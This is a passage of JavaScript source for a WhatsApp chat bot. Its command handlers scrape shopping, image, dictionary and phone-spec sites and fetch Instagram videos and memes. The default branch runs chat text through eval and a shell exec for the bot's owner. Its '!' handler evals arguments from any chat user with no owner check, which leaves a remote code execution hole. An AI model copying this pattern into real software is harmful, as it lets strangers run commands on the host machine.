        const $ = cheerio.load(htmlContent);
        const result = {
            title: '',
            description: '',
            videoLinks: [],
            audioLinks: []
        };

        $('.col').each((_, element) => {
            const titles = $(element).find('#text-786685718 strong').first();
            result.title = titles.text().replace('Title：', '').trim() || result.title;

            const description = $(element).find('.description').text();
            result.description = description.trim() || '';

            $(element).find('a.button.primary').each((_, linkElement) => {
                const linkUrl = $(linkElement).attr('href');
                const quality = $(linkElement).find('span').text().toLowerCase();

                if (linkUrl !== 'javascript:void(0);') {
                    if (quality.includes('audio')) {
                        result.audioLinks.push({
                            quality: quality,
                            url: linkUrl
                        });
                    } else {
                        result.videoLinks.push({
                            quality: quality,
                            url: linkUrl
                        });
                    }
                }
            });
        });

        return result;
    }

    async scrape(links) {
        try {
            return await this.fetch(links);
        } catch (error) {
            console.error(`${error.message}`);
            throw error;
        }
    }
}

    const retatube = new RetaTube();
    try {
        const result = await retatube.scrape(text);
        let videoMessage = `*Title*: ${result.title}\n*Description*: ${result.description}\n\n*Video*:`;
        let audioMessage = `*Audio*:`;

        // Mengirimkan video
        if (result.videoLinks.length > 0) {
            const video = result.videoLinks[0]; // Mengambil video dengan kualitas terbaik
            await David.sendMessage(m.chat, { video: { url: video.url }, caption: videoMessage }, { quoted: m });
        } else {
            await reply("Sorry, video not found.");
        }

     

    } catch (error) {
        await reply(`There is an error: ${error.message}`);
    }
}
break
case 'top': {
            if (!m.isGroup) return m.reply(mess.OnlyGrup)
if (!text) return m.reply(`Example: .top lovers`)
let member = participants.map(u => u.id)
            let top1 = member[Math.floor(Math.random() * member.length)]
            let top2 = member[Math.floor(Math.random() * member.length)]
let top3 = member[Math.floor(Math.random() * member.length)]
            let top4 = member[Math.floor(Math.random() * member.length)]
let top5 = member[Math.floor(Math.random() * member.length)]
            let jawab = `Top 5 *${text}*

1. @${top1.split('@')[0]}
2. @${top2.split('@')[0]}
3. @${top3.split('@')[0]}
4. @${top4.split('@')[0]}
5. @${top5.split('@')[0]}
`
            let menst = [top1, top2, top3, top4, top5]
                    await David.sendText(m.chat, jawab, m, {mentions: menst})
            }
            break
            case 'del': case 'd':{
David.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: m.quoted.id,
participant: m.quoted.sender
}
})
}
break
case 'npms':{
	if (!text) return m.reply('Input Query')
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) return reply(`Query "${text}" not found :/`)
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	m.reply(txt)
}
break
case 'next-holiday': {
  m.reply(mess.wait)
  async function nexLibur() {
  const { data } = await axios.get("https://www.liburnasional.com/");
  let libnas_content = [];
  let $ = cheerio.load(data);
  let result = {
    nextLibur:
      "Holiday" +
      $("div.row.row-alert > div").text().split("Hari libur")[1].trim(),
    libnas_content,
  };
  $("tbody > tr > td > span > div").each(function (a, b) {
    let summary = $(b).find("span > strong > a").text();
    let days = $(b).find("div.libnas-calendar-holiday-weekday").text();
    let dateMonth = $(b).find("time.libnas-calendar-holiday-datemonth").text();
    libnas_content.push({ summary, days, dateMonth });
  });
  return result;
  }
  try {
    let teks = `*${(await nexLibur()).nextLibur}*\n\n`
    let result = (await nexLibur()).libnas_content

    for (let a of result) {
      teks += `Date: ${a.summary}\nDate: ${a.days}\nMonth: ${a.dateMonth}\n\n`
    }
    reply(teks)
  } catch (e) {
    throw e
  }
}
break
case 'lahelu': {
	let tags = ['funny', 'relate', 'gaming', 'nostalgia', 'technology', 'random', 'comic', 'edit', 'wtf', 'sport', 'opinion', 'dark', 'absurd', 'cringe', 'sus', 'animals']
	if(text && !tags.includes(text)) return m.reply(`Meme "${text}" not found! \n\n${tags.map(v => `- ${v}`).join('\n')}`) 
	let url;
	let page = Math.round(Math.random() * 25)
	if(!text) url = `https://lahelu.com/api/post/get-posts?feed=1&page=${page}`
	if(text) url = `https://lahelu.com/api/post/get-posts?feed=1&hashtags[]=${text}&page=${page}`
	let anu = (await axios.get(url)).data
	let data = anu.postInfos[Math.floor(Math.random() * anu.postInfos.length)]
	if(/^video/i.test(data.media)) return await David.sendMessage(m.chat, { video: { url: 'https://cache.lahelu.com/'+data.media }, caption: data.title, viewOnce: true }, { quoted: m }) 
	if(/^image/i.test(data.media)) return await David.sendMessage(m.chat, { image: { url: 'https://cache.lahelu.com/'+data.media }, caption: data.title, viewOnce: true }, { quoted: m }) 
	}
break
   
      
 

case 'ebay': {
  if (!q) return m.reply(`What are you looking for?`);
  const axios = require('axios');
  const cheerio = require('cheerio');
// wm avs
  async function azvxz(query) {
    try { // wm avs
      const url = `https://www.ebay.com/sch/i.html?_nkw=${encodeURIComponent(query)}`;
      const { data } = await axios.get(url);
      const $ = cheerio.load(data);
      const results = [];
      $('.s-item').each((index, element) => {
        const title = $(element).find('.s-item__title').text().trim();
        const price = $(element).find('.s-item__price').text().trim();
        const link = $(element).find('.s-item__link').attr('href');
        if (title && title !== "Shop on eBay") { // Jgn Di Hapus Ini
          results.push({ title, price, link });
        }
      });
      return results;
    } catch (error) {
      console.error('Error:', error);
      return [];
    }
  }
// wm avs
  const query = m.text;
  try {
    const results = await azvxz(query);
// wm avs
    if (results.length === 0) {
      m.reply("No results found for your search.");
    } else {
      let response = "eBay search results:\n\n";
      results.forEach((item, index) => {
        response += `${index + 1}. ${item.title}\nPrice: ${item.price}\nLink: ${item.link}\n\n`;
      });
      m.reply(response);
    }
  } catch (error) {
    m.reply("Terjadi Error.");
  }
}
break

case 'rangkum': {
   if (!q) return m.reply(`Enter the sentence you want to summarize`);
// wm avs
  const sentences = `${q}`.match(/[^.!?]+[.!?]/g) || [];
// wm avs
  const wordFrequency = {};
  sentences.forEach(sentence => {
    const words = sentence.toLowerCase().split(/\s+/);
    words.forEach(word => {
      word = word.replace(/[.,!?]/g, '');
      if (word.length > 0) {
        if (wordFrequency[word]) {
          wordFrequency[word]++;
        } else {
          wordFrequency[word] = 1;
        }
      }
    });
  });
// wm avs
  const sortedWords = Object.keys(wordFrequency).sort((a, b) => wordFrequency[b] - wordFrequency[a]);
// wm avs
  const summarySentences = sentences
    .filter(sentence => {
      const words = sentence.toLowerCase().split(/\s+/).map(word => word.replace(/[.,!?]/g, ''));
      return words.some(word => sortedWords.includes(word));
    })
    .slice(0, 3);
// wm avs
  const summary = summarySentences.join(' ');
// wm avs
  m.reply(summary || "Failed to summarize text.");
}
break
case 'animecharacter': {
 if (!text) {
 m.reply('Example: animecharacter naruto');
 return;
 }
// wm avs
 m.reply('_Patience sir, looking for anime characters..._');
// wm avs
 async function getCharacterInfo(characterName) {
 const query = `
 query ($search: String) {
 Character(search: $search) {
 name {
 full
 }
 description
 media {
 nodes {
 title {
 romaji
 }
 }
 }
 }
 }
 `;
 const variables = {
 search: characterName
 };
// wm avs
 const response = await fetch('https://graphql.anilist.co', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json',
 'Accept': 'application/json',
 },
 body: JSON.stringify({
 query: query,
 variables: variables
 })
 });
 if (!response.ok) {
 throw new Error('Failed to fetch Character data');
 }
// wm avs
 const data = await response.json();
 return data.data.Character;
 }
// wm avs
 try {
 const query = text.trim();
 const characterInfo = await getCharacterInfo(query);
// wm avs
 if (!characterInfo) {
 m.reply('Character');
 return;
 }
// wm avs
 // Format hasil pencarian Character
 const name = characterInfo.name.full;
 const description = characterInfo.description || 'Description None';
 const mediaTitles = characterInfo.media.nodes.map(node => node.title.romaji).join(', ');
// wm avs
 const formattedDescription = description
 .replace(/\n/g, '\n\n') // jgb ubah
 .replace(/__([^__]+)__/g, '*$1*') // jgn ubah 
 .replace(/~\!?\[([^\]]+)]\(([^)]+)\)~?/g, '*$1* ($2)') // jgn ubah ini
 .replace(/^\s+/gm, '');
// wm avs
 const result = `*Name Character:* ${name}\n\n*Description:* ${formattedDescription}\n\n*Media Related:* ${mediaTitles}`;
// wm avs
 m.reply(result);
// wm avs
 } catch (error) {
 m.reply(`There is an error: ${error.message}`);
 }
}
break
        case 'gimage': {
    if (!text) return m.reply(`gimage avosky`)
    m.reply(mess.wait)
    const axios = require('axios')
    const cheerio = require('cheerio')
// wm avs
    const nyariGambar = async (query) => {
        const url = `https://www.google.com/search?q=${encodeURIComponent(query)}&tbm=isch`
        const { data } = await axios.get(url)
        const $ = cheerio.load(data)
        let images = []
        $('img').each((i, elem) => {
            images.push($(elem).attr('src'))
        })
        return images
    }
// wm avs
    nyariGambar(text).then(images => {
        if (images.length === 0) {
            return m.reply('No picture.')
        }
        let imageAvz = images[Math.floor(Math.random() * images.length)]
        David.sendMessage(m.chat, { image: { url: imageAvz }, caption: `*Query* : ${text}\n*Media Url* : ${imageAvz}` }, { quoted: m })
    }).catch(error => {
        m.reply('There is an error.')
    })
}
break

case 'kbbi-kemdikbud': {
    if (!text) return m.reply('Example: kbbi-kemdikbud')
    const axios = require('axios')
    const url = `https://kbbi.kemdikbud.go.id/entri/${encodeURIComponent(text)}`
 // wm avs
    axios.get(url).then(response => {
        const cheerio = require('cheerio')
        const $ = cheerio.load(response.data)
        let definition = $('ol').first().text().trim()
 // wm avs       
        if (!definition) {
            return m.reply('Word not found in KBBI.')
        }
 // wm avs        
        David.sendMessage(m.chat, { text: `${definition}` }, { quoted: m })
    }).catch(error => {
        m.reply('It happened lol.')
    })
}
break
case 'photoleap': {
 if (!q) return m.reply(`Example \n\nphotoleap girl crying`);
  async function textToImageVsky(text) {
    try {
      const { data } = await axios.get("https://tti.photoleapapp.com/api/v1/generate?prompt=" + encodeURIComponent(text));
      return data;
    } catch (err) {
      return null;
    }
  }
//avosky
  const result = await textToImageVsky(text);
//avosky
  if (result && result.result_url) {
    const imageUrl = result.result_url;
    const message = {
      image: { url: imageUrl },
      caption: '𝐐𝐔𝐄𝐄𝐍_𝐀𝐍𝐈𝐓𝐀-𝐕𝟒'
    };
    David.sendMessage(m.chat, message);
  } else {
    m.reply('err.');
  }
}
break

case 'picsum': {
  if (!q) return m.reply(`Example \n\npicsum nature`);
  
  async function picSumAvz(text) {
    try {
      const imageUrl = `https://picsum.photos/seed/${q}/800/600`;
      return imageUrl;
    } catch (err) {
      return null;
    }
  }
//avs
  const result = await picSumAvz(q);
  if (result) {
    const message = {
      image: { url: result },
      caption: `image search results : ${q}`
    };
    David.sendMessage(m.chat, message);
  } else {
    m.reply('err.');
  }
}
break
  
        case 'readmore': {
            const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    David.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
        
case 'gsmarena': {
 if (args.length === 0) {
 m.reply('Please enter the name of the device you want to search for..');
 return;
 }

 async function gsmSearch(q) {
 try {
 const response = await axios({
 method: "get",
 url: `https://gsmarena.com/results.php3?sQuickSearch=yes&sName=${q}`
 });
 const $ = cheerio.load(response.data);
 const result = [];
 
 const device = $(".makers").find("li");
 device.each((i, e) => {
 const img = $(e).find("img");
 result.push({
 id: $(e).find("a").attr("href").replace(".php", ""),
 name: $(e).find("span").html().split("<br>").join(" "),
 description: img.attr("title")
 });
 });
 return result;
 } catch (error) {
 console.error(error);
 throw error;
 }
 }

 gsmSearch(q).then(results => {
 if (results.length === 0) {
 m.reply('No results found.');
 return;
 }
 
 let replyText = `Search results for "${q}":\n\n`;
 results.forEach((device, index) => {
 replyText += `${index + 1}. ${device.name}\nDescription: ${device.description}\nLink: https://gsmarena.com/${device.id}.php\n\n`;
 });
 
 m.reply(replyText);
 }).catch(error => {
 m.reply('An error occurred while searching for devices.');
 console.error(error);
 });
}
break
case 'igvid': case 'igmp4': {
    if (!text) return m.reply(`You need to provide the video URL, reel`);
    let res;
    try {
        res = await fetch(`https://widipe.com/download/igdl?url=${encodeURIComponent(text)}`);
    } catch (error) {
        return m.reply(`An error occurred: ${error.message}`);
    }

    let api_response;
    try {
        api_response = await res.json();
    } catch (error) {
        return m.reply(`Failed to parse API response: ${error.message}`);
    }

    if (!api_response || !api_response.result || api_response.result.length === 0) {
        return m.reply(`No video or image found or Invalid response from API.`);
    }

try {
    const mediaData = api_response.result[0]; // Ambil elemen pertama dari array result
    //const mediaType = mediaData.thumbnail ? 'image' : 'video'; // Periksa apakah thumbnail ada
    const mediaURL = mediaData.url;
    const cap = `HERE IS THE VIDEO`;

            await David.sendMessage(m.chat, { video: { url: mediaURL }, caption: cap }, { quoted: m });
        
    } catch (error) {
        return m.reply(`Failed to send media: ${error}`);
    }
}
break

     

        


default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('!')) {
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
